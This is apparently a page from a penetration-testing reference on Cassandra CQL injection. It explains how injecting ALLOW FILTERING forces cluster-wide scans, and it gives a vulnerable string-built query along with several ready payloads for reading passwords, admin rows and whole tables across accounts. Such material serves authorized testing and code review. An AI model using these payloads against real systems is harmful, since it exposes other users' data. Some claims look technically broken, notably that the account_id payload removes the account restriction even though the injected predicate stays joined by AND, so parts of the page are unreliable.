---
title: "ALLOW FILTERING abuse: forcing full-cluster CQL scans"
description: "Appending ALLOW FILTERING to an injected CQL query removes the partition-key restriction, letting an attacker scan every node and read rows beyond the intended partition."
keywords:
  - ALLOW FILTERING
  - full table scan
  - partition key bypass
  - CQL injection
  - Cassandra data exposure
---

# ALLOW FILTERING abuse

Cassandra protects itself by rejecting any query whose `WHERE` does not constrain the partition key, or that filters on a non-key column, because such a query cannot be served from a single partition and must instead touch every node. The escape hatch is the `ALLOW FILTERING` keyword, which tells the coordinator to run that expensive scan anyway. Injected into a string-built query, it converts a narrow partition lookup into a cluster-wide read.

> **Scope.** For authorized penetration tests, CTF labs, and code review of systems you own or are contracted to assess.

## Why it matters for injection

An application usually scopes a query to one partition the current user is allowed to see:

```python
q = "SELECT * FROM messages WHERE account_id = '" + acct + "' AND box = '" + box + "'"
```

Both predicates sit on key columns, so the query is cheap and tightly scoped. Without `ALLOW FILTERING`, an injected predicate on a **non-key** column is simply refused by the engine, so the attacker's broadened filter never runs. Adding the keyword removes that refusal, and the broadened filter is evaluated against rows from every partition on every node.

## Reading beyond the partition

Given the sink above, a `box` value of:

```sql
inbox' AND body CONTAINS 'password' ALLOW FILTERING /*
```

produces:

```sql
SELECT * FROM messages WHERE account_id = '...' AND box = 'inbox'
AND body CONTAINS 'password' ALLOW FILTERING
```

Dropping the account scope entirely is the stronger move, where the template lets the injection reach the first predicate. If the injectable value is `account_id`, a payload that neutralizes the key constraint and re-filters across the ring exposes other accounts:

```sql
' AND token(account_id) >= token('') ALLOW FILTERING /*
```

`token()` ranges span the whole partitioner ring, so the scan walks every partition. Collection and secondary-column predicates then pick out the rows of interest:

```sql
' AND role = 'admin' ALLOW FILTERING /*
' AND permissions CONTAINS 'billing' ALLOW FILTERING /*
' AND created_at > '2020-01-01' ALLOW FILTERING /*
```

## Combining with IN and ranges

`ALLOW FILTERING` pairs with the operators CQL does allow, letting a single statement sweep a wide value space:

```sql
' AND status IN ('active','locked','pending') ALLOW FILTERING /*
' AND age >= 0 ALLOW FILTERING /*
```

The second payload, with an always-true range on a non-key numeric column, returns every row the engine can reach, the closest CQL equivalent of a `1=1` dump, and depends entirely on `ALLOW FILTERING` to be accepted.

## Placement

The keyword must come after the `WHERE` predicates and before any `LIMIT` the engine applies. A trailing `/*` block comment discards the remainder of the original statement so a stray `LIMIT` or `ALLOW FILTERING` from the template does not break parsing:

```sql
' AND role = 'admin' ALLOW FILTERING /*
```

Where output is not reflected, the same full-scan predicates drive row-count inference in [Blind inference](blind.md).

## References

- [Apache Cassandra: ALLOW FILTERING](https://cassandra.apache.org/doc/latest/cassandra/cql/dml.html#allow-filtering)
- [Apache Cassandra: SELECT](https://cassandra.apache.org/doc/latest/cassandra/cql/dml.html#select)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
